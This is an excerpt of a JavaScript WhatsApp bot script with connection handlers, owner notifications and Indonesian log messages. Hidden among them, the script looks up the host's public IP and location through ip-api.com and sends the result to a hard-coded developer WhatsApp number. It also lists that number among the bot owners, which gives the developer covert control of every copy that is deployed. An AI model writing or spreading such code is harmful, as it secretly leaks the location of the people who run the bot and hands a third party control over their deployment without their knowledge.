...
denz.autoReconnect = ReconnectMode.onConnectionLost
    ...
    denz.browserDescription = ['Specstor','Desktop','3.0']
    await sleep(10000)
    denz.on('qr', qr => {
 ...
 denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Specstor",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6283141953754?text=Assalamualaikum"}}})
	console.log(color('|MENGERIKAN|', 'yellow'), color('Ngirim Info Bot Ke Owner 🙀', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       denz.sendMessage("6283141953754@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Specstor bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6283141953754?text=Assalamualaikum"}}})
     console.log(color('|MENGERIKAN|', 'yellow'), color('Ip Dah Dikirim Ke Owner 🙀', 'cyan'))
   })
      
    denz.on('connecting sabar kon', () => {
		console.log(color('|AJG|'), color('Lagi Connecting Ngab...', 'cyan'))
		})
	
	denz.on('open', () => {
	console.log(color('|AJG|'), color('Dah Connected Ryan Gamtenk :)', 'cyan'))
	}) 
     
    denz.on('ws-close', () => {
        console.log(color('|AJG|'), color('Tolol Gk Bisa Connect Ini Jing Coba Recon Jem.', 'cyan'))
        })
    
    denz.on('close', async () => {
        console.log(color('|AJG|'), color('Dahlah.', 'cyan'))
        })
...
exec(`cd /sdcard/download && play *mp3`)
   ...
   denz.on('chat-update', async (mek) => {
        ...
        ownerNumber = ["6283141953754@s.whatsapp.net","6283141953754@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
...
denz.on('CB:action,,call', async json => {
        ...
        denz.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:`https://wa.me/6283141953754?text=Assalamualaikum`}}})
        await sleep(5000)
